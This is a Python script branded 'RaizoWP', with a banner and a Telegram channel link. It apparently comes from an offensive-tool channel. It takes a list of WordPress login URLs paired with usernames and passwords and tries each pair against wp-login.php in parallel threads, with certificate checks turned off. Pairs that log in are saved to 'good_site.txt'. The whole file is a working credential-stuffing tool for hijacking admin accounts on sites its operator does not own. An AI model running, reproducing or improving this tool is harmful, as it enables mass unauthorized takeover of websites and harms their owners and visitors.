import requests
import os
from multiprocessing.dummy import Pool
from colorama import Fore, init
from requests.exceptions import RequestException

requests.packages.urllib3.disable_warnings()
init()

red = Fore.RED
green = Fore.GREEN
reset = Fore.RESET
yellow = Fore.YELLOW
bluer = Fore.BLUE

banner = f"""
{red}
  _____       _      __          _______  
 |  __ \     (_)     \ \        / /  __ \ 
 | |__) |__ _ _ ______\ \  /\  / /| |__) |
 |  _  // _` | |_  / _ \ \/  \/ / |  ___/ 
 | | \ \ (_| | |/ / (_) \  /\  /  | |     
 |_|  \_\__,_|_/___\___/ \/  \/   |_|     
                                          
                                          
{reset}
{red}[Important]{reset} - > {yellow}TEXT-Format :{reset} {green}' http://site.com/wp-login.php#admin@admin '{reset}\n
{bluer}[Telegram Channel]{reset} - > ' https://t.me/raizoworm_channel '
"""

def login(target):
    try:
        format = target.replace('#', ' ').replace('@', ' ').split()
        url, user, pwd = format[0], format[1], format[2]
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 RuxitSynthetic/1.0 v3652647187556729212 t6142409407075435073 ath259cea6f altpriv cvcv=2 smf=0'
        }

        cook = requests.Session()
        cooki = cook.get(url, allow_redirects=False)
        cookies = dict(cooki.cookies)
        url_dash = url.replace('/wp-login.php', '')
        payload = {'log': f'{user}', 'pwd': f'{pwd}', 'wp-submit': 'Log+In', 'redirect_to': f'{url_dash}/wp-admin/',
                   'testcookie': '1'}
        req = requests.post(url, data=payload, headers=headers, allow_redirects=True, cookies=cookies,
                            verify=False).content.decode('utf8')
        if 'dashboard' in req or 'Howdy, ' in req or '/wp-admin/' in req:
            print(f'[{yellow}#{reset}] {target} => [{green}Success Login{reset}]')
            open('good_site.txt', 'a+', encoding="utf8").write(target + '\n')
        else:
            if 'Invalid username or password' in req or 'Error: The password you entered for the username' in req:
                print(f'[{yellow}#{reset}] {target} => [{red}Invalid Login{reset}]')
                open('invalid_site.txt', 'a+', encoding="utf8").write(target + '\n')
            else:
                print(f'[{yellow}#{reset}] {target} => [{red}Error!{reset}]')
                open('bad_site.txt', 'a+', encoding="utf8").write(target + '\n')

    except RequestException as e:
        print(f'[{yellow}#{reset}] {target} => [{red}{str(e)}{reset}]')
        open('bad_site.txt', 'a+', encoding="utf8").write(target + '\n')

def main():
    try:
        if os.name == "nt":
            os.system('cls')
        elif os.name == "posix":
            os.system('clear')
        else:
            pass
        print(banner)
        file = list(dict.fromkeys(open(input("[List] : ")).read().splitlines()))
        thread = int(input("[Thread] : "))
        pool = Pool(thread)
        pool.map(login, file)
        pool.close()
        pool.join()

    except Exception as e:
        print(e)
        exit()

if __name__ == "__main__":
    main()
